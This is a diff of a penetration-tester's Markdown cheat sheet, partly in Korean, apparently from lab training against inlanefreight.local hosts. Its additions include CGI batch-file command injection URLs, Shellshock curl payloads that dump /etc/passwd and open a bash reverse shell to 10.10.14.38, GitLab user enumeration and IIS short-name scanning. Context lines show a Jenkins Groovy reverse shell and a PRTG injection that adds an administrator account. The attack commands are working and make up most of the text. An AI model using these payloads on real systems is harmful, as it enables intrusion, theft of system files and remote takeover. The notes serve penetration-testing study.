@@ -176,8 +176,29 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > bac
 curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
 ```
 
+### CGI
+- `enableCmdLineArguments` feature enabled
+```bash
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+```
+- `http://10.129.204.227:8080/cgi/welcome.bat?&dir`
+- `http://10.129.204.227:8080/cgi/welcome.bat?&set`
+- `http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe`
+- `http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
+
+#### ShellShock
+```bash
+gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
+
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
+```
+
 ## Jenkins
-- http://jenkins.inlanefreight.local:8000/script
+- `http://jenkins.inlanefreight.local:8000/script`
 ```groovy
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -201,10 +222,43 @@ tar -cvzf updater.tar.gz splunk_shell/
 
 ## PRTG Network Monitor
 - `nmap` 스캔으로 발견됨.
-- https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/
+- `https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/`
 - `setup > account settings > Notifications`
 ```
 test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+```
+
+## osTicket
+- `support portal`에서 새로운 티켓을 요청할 수 있으면 기업에서 사용하는 `email`로 생성이 가능할 수 있다.
+<img width="1481" height="534" alt="image" src="https://github.com/user-attachments/assets/d92a174c-3f84-40d4-9215-0fa2a18060be" />
+<img width="1467" height="968" alt="image" src="https://github.com/user-attachments/assets/ae03cd98-18c5-4c8b-aa23-9f3826447f67" />
+
+## Gitlab
+- `http://gitlab.inlanefreight.local:8081/explore`
+```bash
+git clone https://github.com/dpgg101/GitLabUserEnum
+
+./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
+```
+
+## ColdFusion(8500)
+```bash
+nmap -p- -sC -Pn 10.129.247.30 --open
+```
+<img width="1005" height="469" alt="image" src="https://github.com/user-attachments/assets/5a7eca71-d4cf-4c5d-94a1-5c155ccebacd" />
+
+## IIS(8.3 format enabled)
+```
+http://example.com/~s
+http://example.com/~se
+http://example.com/~sec
+...
+http://example.com/secret~1/somefi~1.txt
+```
+```bash
+git clone https://github.com/irsdl/IIS-ShortName-Scanner
+
+java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
 ```
 
 </details>
@@ -221,6 +275,11 @@ test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prt
 ---
 <details>
   <summary><strong>LDAP(389)</strong></summary>
+  
+```bash
+ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
+```
+  
 </details>
 
 ---
